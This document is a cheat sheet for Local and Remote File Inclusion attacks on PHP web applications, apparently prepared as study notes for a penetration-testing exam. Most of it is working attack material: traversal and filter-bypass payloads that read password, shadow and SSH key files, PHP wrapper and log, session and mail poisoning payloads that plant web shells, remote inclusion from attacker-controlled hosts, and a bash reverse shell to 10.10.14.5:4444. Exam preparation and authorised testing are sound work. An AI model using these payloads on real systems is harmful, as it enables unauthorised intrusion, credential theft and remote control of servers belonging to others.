    Local File Inclusion (LFI)

    Overview

    Important

    Check Course Material If you stuck as well

    Local File Inclusion (LFI) allows attackers to include files from the local file system through vulnerable input parameters. This cheatsheet focuses on practical LFI/RFI techniques for .

    Quick Detection

    Basic Test

    # Linux
http://target.com/page?file=../../../../etc/passwd
http://target.com/page?file=../../../etc/passwd

# Windows  
http://target.com/page?file=../../../../windows/system32/drivers/etc/hosts
http://target.com/page?file=..\..\..\..\windows\win.ini

    Using cURL

    curl --path-as-is http://target.com/../../../../../../../etc/passwd
curl "http://target.com/page.php?file=../../../../etc/passwd"
curl "http://target.com/page.php?file=/etc/passwd"

    Basic LFI Payloads

    # System files
/etc/passwd
/etc/shadow

/etc/issue
/etc/motd

# Process information

/proc/self/stat
/proc/version
/proc/cpuinfo

# Web server configs
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/usr/local/apache2/conf/httpd.conf

# Logs
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog

# SSH keys
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/home/user/.ssh/authorized_keys

# MySQL
/etc/mysql/my.cnf
/var/lib/mysql/mysql/user.frm

    C:\windows\system32\drivers\etc\hosts

    Directory Traversal Techniques

    Basic Traversal

    ../../../../etc/passwd
../../../etc/passwd
../../etc/passwd
../etc/passwd

    Absolute Paths

    /etc/passwd
/var/www/html/config.php
C:\windows\win.ini

    Encoded Traversal

    # URL encoding
..%2F..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double URL encoding
..%252F..%252F..%252Fetc%252Fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Unicode/UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

    Bypass Filters

    # Null byte (PHP < 5.3)
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg

# Double traversal
....//....//....//etc/passwd
..././..././..././etc/passwd

# Mixed slashes
..\..\..\..\etc/passwd
..\/../..\/../etc/passwd

# Extra dots
.....///etc/passwd
....\\etc\passwd

    PHP Wrappers

    php://filter (Read Source Code)

    Base64 encode to read PHP source: 

    php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=../../../../etc/passwd

# Full URL
http://target.com/page?file=php://filter/convert.base64-encode/resource=index.php

    Other conversions: 

    # ROT13
php://filter/read=string.rot13/resource=index.php

# Multiple filters
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/convert.base64-encode|convert.base64-decode/resource=index.php

# Decode output
echo "BASE64_OUTPUT" | base64 -d

    php://input (Code Execution)

    POST data as PHP code: 

    # URL
http://target.com/page?file=php://input

# POST data
curl -X POST --data "<?php system('whoami'); ?>" "http://target.com/page?file=php://input"
curl -X POST --data "<?php system('cat /etc/passwd'); ?>" "http://target.com/page?file=php://input"

# Reverse shell
curl -X POST --data "<?php system('bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"'); ?>" "http://target.com/page?file=php://input"

    data:// (Code Execution)

    Inline PHP code: 

    data://text/plain,<?php system('whoami'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==

# Full URL
http://target.com/page?file=data://text/plain,<?php system('id'); ?>
http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

# Generate base64
echo -n '<?php system($_GET["cmd"]); ?>' | base64

    expect:// (Command Execution)

    Requires expect extension: 

    expect://whoami
expect://id
expect://ls

http://target.com/page?file=expect://whoami

    zip:// (Upload + LFI)

    Create malicious ZIP: 

    echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php

# Upload shell.zip, then:
http://target.com/page?file=zip://uploads/shell.zip%23shell.php&cmd=id
http://target.com/page?file=zip:///var/www/uploads/shell.zip%23shell.php&cmd=whoami

    phar:// (Similar to zip://)

    # Create PHAR archive
http://target.com/page?file=phar://uploads/file.phar/shell.php&cmd=id

    Log Poisoning

    Apache/Nginx Access Logs

    Inject into User-Agent: 

    # Poison log
curl -A "<?php system('whoami'); ?>" http://target.com
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com

# Trigger LFI
http://target.com/page?file=../../../../var/log/apache2/access.log
http://target.com/page?file=../../../../var/log/apache2/access.log&cmd=id
http://target.com/page?file=../../../../var/log/nginx/access.log&cmd=whoami

    Common log locations: 

    /var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/usr/local/apache2/logs/access.log
/usr/local/apache2/logs/error.log
../../../../../../../../../var/log/apache2/access.log

    SSH Auth Logs

    # Poison via SSH attempt
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Trigger LFI
http://target.com/page?file=../../../../var/log/auth.log&cmd=id
/var/log/auth.log
/var/log/secure

    Mail Logs

    # Send email with PHP payload in body
telnet target.com 25
MAIL FROM: attacker@evil.com
RCPT TO: www-data@target.com
DATA
<?php system($_GET['cmd']); ?>
.

# Trigger LFI  
/var/log/mail.log
/var/mail/www-data

    Session File Poisoning

    PHP Sessions

    If you control session data: 

    # Set malicious session variable
http://target.com/profile?name=<?php system('id'); ?>

# Session stored at:
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sessions/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
C:\Windows\Temp\sess_[PHPSESSID]

# Include session file
http://target.com/page?file=../../../../var/lib/php/sessions/sess_abc123xyz

    Remote File Inclusion (RFI)

    Basic RFI

    Requirements: allow_url_include = On

    http://target.com/page?file=http://attacker.com/shell.txt
http://target.com/page?file=http://attacker.com/shell.php
http://target.com/page?file=//attacker.com/shell.txt

    Host Malicious File

    # Create shell.txt (PHP code)
echo '<?php system($_GET["cmd"]); ?>' > shell.txt

# Serve file
python3 -m http.server 80
php -S 0.0.0.0:80

# Include from target
http://target.com/page?file=http://10.10.14.5/shell.txt&cmd=whoami

    SMB Share (Windows)

    # Setup SMB share with Impacket
sudo impacket-smbserver share $(pwd) -smb2support

# Include from SMB
http://target.com/page?file=\\10.10.14.5\share\shell.php
http://target.com/page?file=//10.10.14.5/share/shell.php

    LFI to RCE Techniques

    1. Log Poisoning (Above)

    2. PHP Wrappers (php://input, data://)

    3. /proc/self/environ

    # Poison User-Agent in environ
curl -A "<?php system('whoami'); ?>" http://target.com

# Include environ
http://target.com/page?file=../../../../proc/self/environ

    4. Upload + LFI

    # Upload image with PHP code
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# Include uploaded file
http://target.com/page?file=uploads/image.jpg&cmd=id

    5. Temp File Upload

    # PHP creates temp files during upload
/tmp/phpXXXXXX
/var/tmp/phpXXXXXX

# Brute force with LFI
for i in {0..9}{0..9}{0..9}{0..9}; do
    curl "http://target.com/page?file=/tmp/php$i"
done

    Exam Workflow

    Phase 1: Detection (2-5 min)

    • [ ] Test with ../../../../etc/passwd
    • [ ] Try Windows paths if Linux fails
    • [ ] Check if files are included or just read
    • [ ] Test with absolute paths

    Phase 2: Enumeration (5-10 min)

    • [ ] Read /etc/passwd for usernames
    • [ ] Check SSH keys in /home/user/.ssh/id_rsa
    • [ ] Read web config files
    • [ ] Find application source code
    • [ ] Locate log files

    Phase 3: Exploitation (10-20 min)

    • [ ] Try php://filter to read source code
    • [ ] Attempt php://input for RCE
    • [ ] Test log poisoning if accessible
    • [ ] Try session file poisoning
    • [ ] Check if RFI is possible

    Phase 4: Get Shell (5-15 min)

    • [ ] Execute reverse shell command
    • [ ] Or upload web shell via RFI
    • [ ] Verify access and escalate

    Useful Commands

    Find Web Root

    # Common locations
/var/www/html/
/var/www/
/usr/share/nginx/html/
C:\inetpub\wwwroot\
C:\xampp\htdocs\

# Via error messages or phpinfo()

    Enumerate Users

    # Read /etc/passwd
cat /etc/passwd | grep -E '/bin/(bash|sh)' | cut -d: -f1

# Common usernames
root, admin, www-data, apache, nginx, user

    Check PHP Configuration

    # Via LFI
../../../../proc/self/environ
../../../../etc/php/7.4/apache2/php.ini

# Look for:
allow_url_include = On/Off
allow_url_fopen = On/Off

    Filter Bypass Cheat Sheet

    Filter Bypass
    ../ removed ....//....//etc/passwd
    ../ removed ..././..././etc/passwd
    Absolute path blocked Use relative: ../../../../etc/passwd
    Extension added (.php) Null byte: file.txt%00 (PHP < 5.3)
    Extension added Use php://filter wrapper
    http:// blocked Use //attacker.com/shell.txt
    Path sanitized Try \ on Windows: ..\..\..\windows\win.ini

    Important Notes

    Null Byte

    Null byte bypass (%00) only works on PHP < 5.3.4

    PHP Wrappers

    Always try php://filter/convert.base64-encode/resource= to read source code

    RFI Requirements

    RFI requires allow_url_include = On in php.ini (usually disabled)

    Quick Win

    If you can read files, immediately check: - /etc/passwd for usernames - /home/user/.ssh/id_rsa for SSH keys - Web config files for database credentials
